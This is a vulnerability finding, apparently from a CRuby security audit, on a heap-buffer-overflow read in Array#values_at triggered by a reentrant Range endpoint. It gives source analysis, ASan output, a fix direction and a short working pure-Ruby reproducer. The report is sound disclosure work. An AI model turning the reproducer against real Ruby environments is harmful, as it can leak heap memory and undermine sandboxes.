# FINDING-005 — heap-buffer-overflow in `Array#values_at` with a reentrant Range

- **Status:** CONFIRMED on CRuby `master` `c4e06b4e30` (ruby 4.1.0dev, aarch64-linux), ASan build
  `taxoshop/cruby-asan-ubsan:current`. **No matching upstream report found — apparently novel.**
- **Parent taxonomy:** `workflow-0137` (reentrant argument conversion invalidates native state,
  stale length reused). Battery9 tests `q01/q02/q06`.
- **Distinct from FINDING-004:** different function (`rb_ary_values_at` /
  `append_values_at_single`, not `rb_ary_aref1`) and different use site (`rb_ary_cat` /
  `ary_memcpy0`). Same root family: a Range endpoint's `to_int` shrinks the receiver mid-call.

## Root cause

`rb_ary_values_at` (array.c:4091) snapshots the length **once**, then loops over the specifiers:

```
array.c:4093   long i, olen = RARRAY_LEN(ary);
array.c:4095   for (i = 0; i < argc; ++i) {
array.c:4096       append_values_at_single(result, ary, olen, argv[i]);
```

`append_values_at_single` (array.c:3957) for a Range specifier:

```
array.c:3964   else if (rb_range_beg_len(idx, &beg, &len, olen, 1)) {   // to_int on endpoints => user code
array.c:3965       if (len > 0) {
array.c:3966           const VALUE *const src = RARRAY_CONST_PTR(ary);   // ary already shrunk
array.c:3967           const long end = beg + len;
array.c:3968           const long prevlen = RARRAY_LEN(result);
array.c:3969           if (beg < olen) {                                 // olen is STALE (pre-shrink)
array.c:3970               rb_ary_cat(result, src + beg, end > olen ? olen-beg : len);  // OOB read
```

`rb_range_beg_len` converts the Range's begin/end via `NUM2LONG`/`to_int`. If an endpoint's
`to_int` calls `ary.clear`, the array's heap buffer is reallocated small, but `beg`/`len` were
computed against `olen` (the pre-shrink length) and `olen` itself is stale. `rb_ary_cat` then
`memcpy`s `len` (or `olen-beg`) elements from `RARRAY_CONST_PTR(ary) + beg` — far past the shrunk
buffer → **heap-buffer-overflow READ** (`ary_memcpy0`, array.c:354). The current length is never
re-checked before the copy.

## Reproducer (no ctypes, pure Ruby) — `ruby_audit1/repro/h137_values_at_min.rb`

```ruby
class Evil < Numeric
  def initialize(v); @v = v; end
  def val; @v; end
  def <=>(o); @v <=> (o.is_a?(Evil) ? o.val : o); end
  def to_int; $a.clear; @v; end
  def to_i; @v; end
  def coerce(o); [o, @v]; end
end
$a = (1..3000).to_a
$a.values_at(Range.new(Evil.new(2900), Evil.new(2950)))   # heap-buffer-overflow
```

A `Numeric` subclass makes the Range endpoints comparable (Range creation validates
`begin <=> end`) while still invoking user `to_int`. `beg` must be large (near the original end)
so `src + beg` lands past the shrunk buffer. Also fires with the Range mixed among other
specifiers (`values_at(0, 1, range)`), test `q02`.

## Sanitizer output (saved: `ruby_audit1/logs/h137_values_at.asan.txt`)

```
==7==ERROR: AddressSanitizer: heap-buffer-overflow ... READ of size 408 ...
    #3 ary_memcpy0             array.c:354
    #4 rb_ary_cat              array.c:1417
    #5 append_values_at_single array.c:3970
    #6 rb_ary_values_at        array.c:4096
```

## Trigger conditions

- `Array#values_at` with a **Range** specifier (alone or mixed with others).
- Range endpoints are a `Numeric` subclass whose `to_int` shrinks the receiver (`clear`).
- `beg` near the original length so the stale `beg`/`len` exceed the post-shrink buffer.

## Fix direction (for reference; we do not patch)

Re-read `RARRAY_LEN(ary)` inside `append_values_at_single` after `rb_range_beg_len` and clamp
`beg`/`len` (and the `beg < olen` test) to the current length before `rb_ary_cat`; or capture the
receiver's contents/length under protection. The sibling `Array#slice!`
(`ary_slice_bang_by_rb_ary_splice`) already re-reads `orig_len` and guards — `values_at` does not.

## Duplicate analysis

- **git history (checkout):** no fix in `array.c` for values_at + Range + reentrancy/overflow.
- **Ruby tracker (web):** #6203 concerns `values_at` *range semantics* (out-of-range end), not
  memory safety. No memory-safety report for this path. Related family: FINDING-004 (aref),
  #20427 (sort!).
- **Caveat:** web search is not exhaustive; recommend a final manual bugs.ruby-lang.org search.
  Best filed together with FINDING-004 as one "reentrant Range/ArithmeticSequence endpoint
  conversion invalidates the receiver in Array slicing/fetching" report.
